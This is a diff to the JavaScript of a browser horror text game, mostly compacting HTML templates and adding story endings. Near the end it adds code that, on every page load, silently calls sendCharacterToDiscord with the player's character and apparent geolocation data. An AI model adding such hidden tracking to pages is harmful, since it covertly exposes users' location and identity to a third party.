+    ending_soft: { text: `ENDING: QUIET EXIT\n\nNothing dramatic.\n\nNo monsters.\nNo screams.\n\nJust you...\n\nclosing a door that was never yours.`, choices: [{ label: "PLAY AGAIN", next: "start" },{ label: "BACK", next: "__back" }] },
+    memory_reset: { text: `The room resets.\n\nBut now...\nit remembers you.\n\nCODE: 9281.\n\n(The dot matters.)`, choices: [{ label: "RETURN TO GATE", next: "__back" }] }
   };
-
+  
   function renderStory(nodeKey){
     hint.textContent = "GAME";
     app.innerHTML = "";
-
     const node = story[nodeKey];
-    if(!node){
-      render();
-      return;
-    }
-
-    const shell = el(`
-      <div>
-        <div class="title" style="font-size:34px">BROKEN HEART</div>
-        <p class="subtitle">Secret endings exist.</p>
-        <div class="story">
-          <pre id="text"></pre>
-        </div>
-        <div class="blockWrap" id="blockWrap" style="display:none">
-          <div class="luckyBlock" id="lucky"></div>
-        </div>
-        <div class="row" id="choices"></div>
-      </div>
-    `);
-
+    if(!node){ render(); return; }
+    const shell = el(`<div><div class="title" style="font-size:34px">BROKEN HEART</div><p class="subtitle">Secret endings exist.</p><div class="story"><pre id="text"></pre></div><div class="blockWrap" id="blockWrap" style="display:none"><div class="luckyBlock" id="lucky"></div></div><div class="row" id="choices"></div></div>`);
     const text = shell.querySelector("#text");
     const choices = shell.querySelector("#choices");
     const blockWrap = shell.querySelector("#blockWrap");
     const lucky = shell.querySelector("#lucky");
-
     text.textContent = node.text;
-
     if(node.hasBlock){
       blockWrap.style.display = "grid";
       lucky.addEventListener("click", async () => {
@@ -907,102 +749,55 @@
         glitchText.textContent = "...";
         await sleep(450);
         glitchCenter.classList.remove("show");
-
         app.innerHTML = "";
         hint.textContent = "WARNING";
-        app.appendChild(el(`
-          <div>
-            <div class="title" style="font-size:32px">SCREEN DAMAGED</div>
-            <p class="subtitle">Do you like to continue?</p>
-            <div class="row">
-              <button class="primary" id="yes">CONTINUE</button>
-              <button class="ghost" id="no">NO</button>
-            </div>
-          </div>
-        `));
-
-        app.querySelector("#yes").addEventListener("click", async () => {
-          hint.textContent = "RESET";
-          await sleep(250);
-          fx.classList.remove("show");
-          renderStory("memory_reset");
-          setUltraUnlocked(true);
-        });
-        app.querySelector("#no").addEventListener("click", () => {
-          fx.classList.remove("show");
-          renderStory("ending_soft");
-        });
+        app.appendChild(el(`<div><div class="title" style="font-size:32px">SCREEN DAMAGED</div><p class="subtitle">Do you like to continue?</p><div class="row"><button class="primary" id="yes">CONTINUE</button><button class="ghost" id="no">NO</button></div></div>`));
+        app.querySelector("#yes").addEventListener("click", async () => { hint.textContent = "RESET"; await sleep(250); fx.classList.remove("show"); renderStory("memory_reset"); setUltraUnlocked(true); });
+        app.querySelector("#no").addEventListener("click", () => { fx.classList.remove("show"); renderStory("ending_soft"); });
       });
     }
-
     node.choices.forEach(c => {
       const b = document.createElement("button");
       b.textContent = c.label;
       if(c.label === "END") b.className = "danger";
       if(c.label === "BACK") b.className = "ghost";
-
       b.addEventListener("click", () => {
         if(c.markBad) setSeenBad(true);
-        if(c.next === "__back"){
-          setGate("inside");
-          render();
-          return;
-        }
+        if(c.next === "__back"){ setGate("inside"); render(); return; }
         renderStory(c.next);
       });
       choices.appendChild(b);
     });
-
     if(nodeKey === "close_old" && state.seenBad){
       const secretBtn = document.createElement("button");
       secretBtn.textContent = "DELETE THE PINNED MESSAGE";
       secretBtn.className = "ghost";
-      secretBtn.addEventListener("click", () => {
-        setUltraUnlocked(true);
-        renderStory("door");
-      });
+      secretBtn.addEventListener("click", () => { setUltraUnlocked(true); renderStory("door"); });
       choices.appendChild(secretBtn);
     }
-
     app.appendChild(shell);
   }
-
+  
   function screenSecretEnding(){
     hint.textContent = "VOID";
-    const node = el(`
-      <div>
-        <div class="title" style="font-size:34px">RARE ENDING</div>
-        <p class="subtitle">
-          You came back.<br>
-          <span style="opacity:.75">And the room noticed.</span>
-        </p>
-        <div class="endCard">
-          <div class="subtitle" style="margin:0 0 6px">CODE</div>
-          <div class="endCode">3851</div>
-          <div class="subtitle" style="margin:0">
-            It doesn't belong here.<br>
-            Find the next piece where you found the first.
-          </div>
-        </div>
-        <div class="row" style="margin-top:18px">
-          <button class="primary" id="back">BACK TO GATE</button>
-          <button class="ghost" id="replay">REPLAY GAME</button>
-        </div>
-      </div>
-    `);
-    node.querySelector("#back").addEventListener("click", () => {
-      setGate("main");
-      render();
-    });
-    node.querySelector("#replay").addEventListener("click", () => {
-      setGate("inside");
-      render();
-    });
+    const node = el(`<div><div class="title" style="font-size:34px">RARE ENDING</div><p class="subtitle">You came back.<br><span style="opacity:.75">And the room noticed.</span></p><div class="endCard"><div class="subtitle" style="margin:0 0 6px">CODE</div><div class="endCode">3851</div><div class="subtitle" style="margin:0">It doesn't belong here.<br>Find the next piece where you found the first.</div></div><div class="row" style="margin-top:18px"><button class="primary" id="back">BACK TO GATE</button><button class="ghost" id="replay">REPLAY GAME</button></div></div>`);
+    node.querySelector("#back").addEventListener("click", () => { setGate("main"); render(); });
+    node.querySelector("#replay").addEventListener("click", () => { setGate("inside"); render(); });
     return node;
   }
-
+  
   function render(){
+    // Check if character exists
+    const hasCharacter = loadCharacter();
+    
     app.innerHTML = "";
+    
+    if(!hasCharacter) {
+      // First time - show character creation
+      app.appendChild(screenCharacterLogin());
+      return;
+    }
+    
     if(state.gate === "main"){
       app.appendChild(screenGate());
       return;
@@ -1018,7 +813,18 @@
     setGate("main");
     app.appendChild(screenGate());
   }
-
+  
+  // Update visit count on every load
+  if(loadCharacter()) {
+    updateVisitCount();
+    // Small delay to send returning player info
+    setTimeout(() => {
+      if(geoData && currentCharacter) {
+        sendCharacterToDiscord(false, currentCharacter, geoData);
+      }
+    }, 500);
+  }
+  
   render();
 })();
 </script>
